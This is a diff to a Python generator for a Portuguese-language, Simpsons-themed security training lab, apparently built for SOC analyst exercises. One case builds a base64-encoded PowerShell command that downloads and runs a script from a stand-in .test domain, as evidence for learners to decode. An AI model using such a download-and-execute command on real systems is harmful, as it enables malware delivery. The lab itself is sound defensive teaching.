@@ -13,7 +13,10 @@ import json
 import random
 import shutil
 from datetime import datetime, timedelta
+import sys
 from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parent))
 
 OUT = Path(__file__).resolve().parent.parent / "config/includes.chroot/usr/share/dohsec/lab"
 INICIO = datetime(2026, 3, 14, 7, 0, 0)
@@ -71,8 +74,7 @@ Responda com `lab responder {n} "sua resposta"`. Travou? `lab dica {n}`.
 """)
 
 
-def aula_pastas(rnd):
-    aula = "01-andando-pelas-pastas"
+def aula_pastas(rnd, aula):
     palavra = "rosquinha-azul"
     escreve(aula, "usina/refeitorio/cardapio.txt", "Segunda: donut\nTerca: donut\nQuarta: donut recheado\n")
     escreve(aula, "usina/reator/aviso.txt", "Nao encoste em nada brilhante.\n")
@@ -106,8 +108,7 @@ Qual e a palavra-chave escrita no bilhete?""")
     }
 
 
-def aula_escondidos(rnd):
-    aula = "02-arquivos-escondidos"
+def aula_escondidos(rnd, aula):
     palavra = "granulado"
     escreve(aula, "armario/uniforme.txt", "Camisa branca, gravata verde.\n")
     escreve(aula, "armario/marmita.txt", "Hoje tem donut. Amanha tambem.\n")
@@ -136,8 +137,7 @@ Qual e a senha escrita no arquivo escondido?""")
     }
 
 
-def aula_grep(rnd):
-    aula = "03-procurando-com-grep"
+def aula_grep(rnd, aula):
     linhas = []
     t = INICIO
     eventos = ["porta do refeitorio aberta", "cafe reabastecido", "cracha lido na catraca",
@@ -172,8 +172,7 @@ Em qual numero de linha esta o alerta?""")
     }
 
 
-def aula_pipe(rnd):
-    aula = "04-contando-com-pipe"
+def aula_pipe(rnd, aula):
     linhas = []
     falhas = 0
     t = INICIO
@@ -208,8 +207,7 @@ Leia o exemplo assim: "pegue as linhas com OK e conte quantas sao".""",
     }
 
 
-def aula_colunas(rnd):
-    aula = "05-filtrando-colunas"
+def aula_colunas(rnd, aula):
     pessoas = ["homer", "lenny", "carl", "marge", "smithers", "frank.grimes", "moe"]
     pesos = [5, 9, 8, 2, 4, 3, 1]
     linhas = ["horario,pessoa,porta"]
@@ -252,8 +250,7 @@ Quem passou o cracha mais vezes?""")
 # ---------------------------------------------------------------------------
 # 6. Brute force em conta de servico
 # ---------------------------------------------------------------------------
-def caso_forca_bruta(rnd):
-    caso = "06-forca-bruta"
+def caso_forca_bruta(rnd, caso):
     vencedor = "198.51.100.77"
     atacantes = [f"203.0.113.{n}" for n in rnd.sample(range(10, 250), 12)] + [vencedor]
     linhas = []
@@ -287,7 +284,7 @@ def caso_forca_bruta(rnd):
            "Qual IP conseguiu entrar na conta `svc_backup`?",
            ["evidencias/auth.log"])
     return {
-        "id": caso, "titulo": "Brute force em conta de servico", "trilha": "casos",
+        "id": caso, "titulo": "Brute force em conta de servico", "trilha": "analista",
         "aprendizado": ['O que aconteceu: alguem testou milhares de senhas ate acertar a da conta svc_backup (ataque de forca bruta).',
             'Por que e perigoso: contas de servico costumam ter muito acesso e ninguem percebe quando sao usadas.',
             'Como se previne: login por chave em vez de senha, bloqueio apos varias falhas, MFA e alerta para login de IP de fora.', "Comando que ficou: grep 'Accepted' auth.log"], "nivel": "facil",
@@ -304,8 +301,7 @@ def caso_forca_bruta(rnd):
 # ---------------------------------------------------------------------------
 # 7. PowerShell encoded no Financeiro
 # ---------------------------------------------------------------------------
-def caso_powershell(rnd):
-    caso = "07-powershell-financeiro"
+def caso_powershell(rnd, caso):
     dominio = "atualiza-donut.test"
     script = f"IEX (New-Object Net.WebClient).DownloadString('http://{dominio}/folha.ps1')"
     enc = base64.b64encode(script.encode("utf-16-le")).decode()
@@ -334,7 +330,7 @@ def caso_powershell(rnd):
            "Qual dominio o comando codificado tenta contatar?",
            ["evidencias/processos.csv"])
     return {
-        "id": caso, "titulo": "PowerShell encoded no Financeiro", "trilha": "casos",
+        "id": caso, "titulo": "PowerShell encoded no Financeiro", "trilha": "analista",
         "aprendizado": ['O que aconteceu: um documento do Word abriu um PowerShell escondido que baixa um script da internet.',
             'Por que e perigoso: o -enc esconde o comando de quem olha rapido; e um truque comum para fugir de filtros.',
             'Como se previne: bloquear macros de documentos da internet, registrar os comandos do PowerShell e alertar quando o Word abre um PowerShell.', "Comando que ficou: echo 'VALOR' | base64 -d | iconv -f utf-16le"], "nivel": "medio",
@@ -351,8 +347,7 @@ def caso_powershell(rnd):
 # ---------------------------------------------------------------------------
 # 8. Servidor minerando donutcoin
 # ---------------------------------------------------------------------------
-def caso_donutcoin(rnd):
-    caso = "08-donutcoin"
+def caso_donutcoin(rnd, caso):
     persistencia = "/var/tmp/.cache/kdonut-watch.sh"
     ps = ["USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND",
           "root           1  0.0  0.1 167432 11924 ?        Ss   mar14   0:04 /sbin/init",
@@ -386,7 +381,7 @@ def caso_donutcoin(rnd):
            "Qual arquivo garante que o minerador volta depois de ser morto? (caminho completo)",
            ["evidencias/ps.txt", "evidencias/crontabs.txt", "evidencias/conexoes.txt"])
     return {
-        "id": caso, "titulo": "Servidor minerando donutcoin", "trilha": "casos",
+        "id": caso, "titulo": "Servidor minerando donutcoin", "trilha": "analista",
         "aprendizado": ['O que aconteceu: um invasor usou o servidor web para minerar criptomoeda e agendou no cron um script que religa o minerador.',
             'Por que e perigoso: matar o processo nao resolve; sem remover a persistencia, o problema volta sozinho.',
             'Como se previne: manter o site e o sistema atualizados, monitorar CPU e conexoes de saida, revisar crontabs.',
@@ -404,8 +399,7 @@ def caso_donutcoin(rnd):
 # ---------------------------------------------------------------------------
 # 9. invoice_real.pdf.exe
 # ---------------------------------------------------------------------------
-def caso_pdf_exe(rnd):
-    caso = "09-pdf-exe"
+def caso_pdf_exe(rnd, caso):
     dominio = "burns-faturas.test"
     anexo = base64.b64encode("Arquivo de treinamento do Laboratorio Springfield. Nao e executavel.".encode()).decode()
     eml = f"""Return-Path: <cobranca@{dominio}>
@@ -447,7 +441,7 @@ Content-Transfer-Encoding: base64
            "Qual o dominio real de quem enviou o e-mail?",
            ["evidencias/email.eml"])
     return {
-        "id": caso, "titulo": "invoice_real.pdf.exe executado", "trilha": "casos",
+        "id": caso, "titulo": "invoice_real.pdf.exe executado", "trilha": "analista",
         "aprendizado": ['O que aconteceu: phishing. O From dizia Financeiro, mas o e-mail saiu de outro dominio, e o anexo era um programa disfarcado de PDF.',
             'Por que e perigoso: o campo From e escrito por quem envia; so os outros cabecalhos mostram a origem real.',
             'Como se previne: SPF, DKIM e DMARC configurados, mostrar extensoes de arquivo no Windows e desconfiar de urgencia.', "Comando que ficou: grep -iE '^(Return-Path|Received|Authentication-Results)' email.eml"], "nivel": "facil",
@@ -464,8 +458,7 @@ Content-Transfer-Encoding: base64
 # ---------------------------------------------------------------------------
 # 10. Everyone em grupo privilegiado
 # ---------------------------------------------------------------------------
-def caso_everyone(rnd):
-    caso = "10-everyone-privilegiado"
+def caso_everyone(rnd, caso):
     culpado = "estagiario.ralph"
     grupos = ["Usuarios da Usina", "Financeiro", "Operadores do Reator", "Manutencao", "Admins da Usina", "VPN"]
     admins = ["ti.patty", "ti.selma", "smithers"]
@@ -487,7 +480,7 @@ def caso_everyone(rnd):
            "Qual conta adicionou o Everyone no grupo privilegiado?",
            ["evidencias/grupos.csv"])
     return {
-        "id": caso, "titulo": "Everyone em grupo privilegiado", "trilha": "casos",
+        "id": caso, "titulo": "Everyone em grupo privilegiado", "trilha": "analista",
         "aprendizado": ['O que aconteceu: uma conta sem necessidade de acesso adicionou o grupo Everyone (todo mundo) num grupo de administradores.',
             'Por que e perigoso: qualquer conta da empresa virou administradora, inclusive uma conta invadida.',
             'Como se previne: menor privilegio, revisao periodica de acessos e alerta sempre que um grupo administrativo muda.',
@@ -501,13 +494,34 @@ def caso_everyone(rnd):
     }
 
 
+def ordem():
+    """Ordem dos casos no laboratorio (a numeracao sai daqui)."""
+    import lab_casos as extra
+    return [
+        # Nivel 0: Estagiario
+        ("andando-pelas-pastas", aula_pastas), ("arquivos-escondidos", aula_escondidos),
+        ("procurando-com-grep", aula_grep), ("contando-com-pipe", aula_pipe),
+        ("filtrando-colunas", aula_colunas),
+        *extra.ESTAGIARIO,
+        # Nivel 1: Operador
+        *extra.OPERADOR,
+        # Nivel 2: Analista SOC
+        ("forca-bruta", caso_forca_bruta), ("powershell-financeiro", caso_powershell),
+        ("donutcoin", caso_donutcoin), ("pdf-exe", caso_pdf_exe),
+        ("everyone-privilegiado", caso_everyone),
+        *extra.ANALISTA,
+        # Nivel 3: Especialista
+        *extra.ESPECIALISTA,
+    ]
+
+
 def main():
     if (OUT / "casos").exists():
         shutil.rmtree(OUT / "casos")
     rnd = random.Random(742)
-    funcoes = (aula_pastas, aula_escondidos, aula_grep, aula_pipe, aula_colunas,
-               caso_forca_bruta, caso_powershell, caso_donutcoin, caso_pdf_exe, caso_everyone)
-    casos = [f(rnd) for f in funcoes]
+    casos = []
+    for slug, f in ordem():
+        casos.append(f(rnd, f"{len(casos) + 1:02d}-{slug}"))
     (OUT / "casos.json").write_text(json.dumps(casos, ensure_ascii=False, indent=2) + "\n", newline="\n")
     print(f"{len(casos)} casos em {OUT}")
 
